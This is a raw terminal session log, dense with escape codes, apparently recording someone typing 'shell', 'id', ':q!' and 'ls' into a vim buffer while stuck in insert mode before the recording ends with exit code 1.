+[24;1H[1m-- INSERT --[0m[24;13H[K[24;63H0,1[11CAll[1;1Hhell[2;1H[K[24;63H2[2;1H[K[24;1H[1m-- INSERT --[0m[24;13H[K[24;63H0,1[11CAll[1;1Hhell[2;1H[K[24;63H2[2;1H[K[?2004h[24;1H[1m-- INSERT --[0m[24;13H[K[24;63H0,1[11CAll[1;1Hhell[2;1H[K[24;63H2[2;1Hshell[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hshell
+[Kshell
+shell[3;1H[K[24;63H3[3;1H[Kshell[3;1H[K[24;63H3[3;1H[K[?2004hshell[3;1H[K[24;63H3[3;1Hid[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hid
+[Kid
+id[4;1H[K[24;63H4[4;1H[Kid[4;1H[K[24;63H4[4;1H[K[?2004hid[4;1H[K[24;63H4[4;1HZZ[K[KZZ[K[K:q![?2004l[C[C[C[C[C[C[C[K[?2004h:q!
+[K:q!
+:q![5;1H[K[24;63H5[5;1H[K:q![5;1H[K[24;63H5[5;1H[K[?2004h:q![5;1H[K[24;63H5[5;1H[?2004l[C[C[C[C[C[C[C[C[?2004h
+[K
+[K[K[?2004h[?2004l[?2004h
+[K[K[?2004h[?2004l[?2004h
+[K[K[?2004h[?2004l[?2004h
+[K[K[?2004h[?2004l[?2004h
+[K[K[?2004h[?2004l[?2004h
+[K[K[?2004hls[?2004l[K[?2004hls
+[K[6;1H[K[24;63H6[6;1H
+[7;1H[K[24;63H7[7;1H
+
+[8;1H[K[9;1H[K[24;63H9[9;1H[K[8;1H[K[9;1H[K[24;63H9[9;1H[K[8;1H[K[9;1H[K[24;63H9[9;1H
+
+[10;1H[K[11;1H[K[24;63H11,1[11;1Hls
+ls[12;1H[K[24;64H2[12;1H[Kls[12;1H[K[24;64H2[12;1H[K[?2004hls[12;1H[K[24;64H2[12;1H[?2004l[C[C[C[C[C[C[C[?2004h
+[K[K[?2004h[?2004l[?2004h
+[K
+[13;1H[K[24;64H3[13;1H[K[?2004h[13;1H[K[24;64H3[13;1H[?2004l[C[C[C[C[C[?2004h
+[K[K[?2004h[?2004l[?2004h
+[K
+[14;1H[K[24;64H4[14;1H[K[14;1H[K[24;64H4[14;1H[K[?2004h[14;1H[K[24;64H4[14;1H[?2004l[C[C[C[C[C[?2004h
+[K[?2004h[?2004l[?2004h
+
+
+[15;1H[K[16;1H[K[24;64H6[16;1H[K[?2004h[15;1H[K[16;1H[K[24;64H6[16;1H[?2004l[C[C[C[C[C[C[C[?2004h
+[K[?2004h[?2004l[?2004h
+[K[?2004h[?2004l[?2004h
+[K[?2004h[?2004l[?2004h
+[K[?2004h[?2004l[?2004h
+[K[?2004h[?2004l[?2004h
+[K
+[?2004l
+Script done on 2026-10-04 17:38:09+03:00 [COMMAND_EXIT_CODE="1"]
